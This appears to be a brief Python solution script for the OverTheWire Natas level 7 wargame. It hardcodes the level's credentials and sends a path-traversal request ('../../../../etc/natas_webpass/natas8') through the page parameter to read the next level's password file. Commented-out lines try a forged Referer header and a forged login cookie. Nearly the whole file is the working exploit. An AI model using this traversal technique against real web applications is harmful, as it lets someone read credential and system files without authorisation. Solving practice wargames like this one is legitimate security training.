#!/bin/python3
import requests

username = "natas7"
password = "jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr"
#headers = { 'Referer': 'http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8'}
#cookies = dict(loggedin='1')
r = requests.post('http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8', auth=(username, password))
print(r.headers)
print(r.text)
#print(r.cookies['loggedIn'])
